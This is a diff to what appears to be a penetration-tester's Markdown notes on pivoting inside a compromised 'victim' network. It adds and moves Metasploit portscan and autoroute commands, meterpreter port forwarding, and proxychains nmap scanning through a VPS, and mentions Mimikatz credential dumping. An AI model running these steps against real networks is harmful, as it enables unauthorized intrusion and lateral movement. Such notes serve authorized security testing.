@@ -71,7 +71,7 @@ Mimikatz is also a good choice to dump the username and password from memory of 
 
 ### You don't have the administrator privilege, and the server has a protection system.
 
-Shutdown your computer and go to sleep. Don't think about it.
+Shutdown your computer and go to sleep unless you have some 0day vulnerabilities.
 
 ---
 
@@ -85,6 +85,17 @@ set srvhost 127.0.0.1
 set srvport 1080
 run
 ```
+Then you can scan the subnet with the help of msf built-in module:
+```shell
+auxiliary/scanner/portscan
+scanner/portscan/syn
+scanner/portscan/tcp
+```
+Another msf built-in module "autoroute" is a good choice as well. (https://www.offensive-security.com/metasploit-unleashed/proxytunnels/)
+```shell
+meterpreter > run post/multi/manage/autoroute
+```
+
 Or you can use EarthWorm(http://rootkiter.com/EarthWorm/) to forward the victim machine's port to your VPS and use proxy
 chains or proxifier in your local machine:
 For your VPS:
@@ -115,15 +126,9 @@ proxychains4 nmap -sT -Pn -open 192.168.100.1/22
 ```
 I have tried so many times to find out all the machines in the victim's intranet but I was usually failed. It just works for few times and the process is too slow. Maybe nmap is the reason for this problem, it works well when I use proxychains to get information from other hosts within the same intranet.
 
-You can also use the msf built-in module to scan:
-```shell
-auxiliary/scanner/portscan
-scanner/portscan/syn
-scanner/portscan/tcp
-```
 If you need ports forwarding, it's also available in meterpreter:
 ```shell
-meterpreter> portfwd add -l 55555 -r 192.168.1.1 -p 3306
+meterpreter > portfwd add -l 55555 -r 192.168.1.1 -p 3306
 ```
 Another popular tool is lcx.exe:
 For attacker:
